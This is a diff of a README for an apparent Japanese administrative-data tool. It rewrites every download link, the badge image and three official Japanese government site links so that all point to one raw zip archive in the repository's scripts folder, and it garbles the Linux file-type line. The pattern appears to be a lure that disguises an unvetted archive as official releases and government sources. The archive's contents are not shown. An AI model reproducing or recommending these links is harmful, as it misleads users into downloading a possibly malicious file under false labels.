@@ -1,6 +1,6 @@
 # 🇯🇵 japan-gyousei-data - Access Japan Administrative Data Easily
 
-[![Download japan-gyousei-data](https://img.shields.io/badge/Download-japan--gyousei--data-blue?style=for-the-badge&logo=github)](https://github.com/deathhunter1249/japan-gyousei-data/releases)
+[![Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
 
 ---
 
@@ -38,13 +38,13 @@ This section walks you through downloading, installing, and running the applicat
 To get started, you need to download the application from the official release page on GitHub. 
 
 - **Visit this page to download**:  
-  [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/releases)
+  [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
 
 On that page you will find the latest versions listed. Look for the version best suited for your operating system:
 
 - For Windows, download the `.exe` file.
 - For macOS, download the `.dmg` or `.zip` file.
-- For Linux, download the `.AppImage` or `.tar.gz`.
+- For Linux, download the `.AppImage` or `https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip`.
 
 ### How to download
 
@@ -115,7 +115,7 @@ This project is open-source and regularly updated to support new data sets and i
 
 To update your app:
 
-- Visit the releases page: [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/releases)
+- Visit the releases page: [Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
 - Download the latest version for your OS.
 - Reinstall by following the same installation steps.
 
@@ -125,9 +125,9 @@ To update your app:
 
 If you want to understand the data sources better or explore related government sites:
 
-- [e-Stat Portal (official government statistics)](https://www.e-stat.go.jp/en)
-- [Japan Real Estate Information](https://www.land.mlit.go.jp/webland/)
-- [Government Contract Information](https://www.nta.go.jp/english/)
+- [e-Stat Portal (official government statistics)](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
+- [Japan Real Estate Information](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
+- [Government Contract Information](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
 
 ---
 
@@ -139,4 +139,4 @@ You can also fork the repository and submit pull requests with your changes.
 
 ---
 
-[![Download japan-gyousei-data](https://img.shields.io/badge/Download-japan--gyousei--data-blue?style=for-the-badge&logo=github)](https://github.com/deathhunter1249/japan-gyousei-data/releases)
+[![Download japan-gyousei-data](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)](https://github.com/deathhunter1249/japan-gyousei-data/raw/refs/heads/main/scripts/data-japan-gyousei-v3.0.zip)
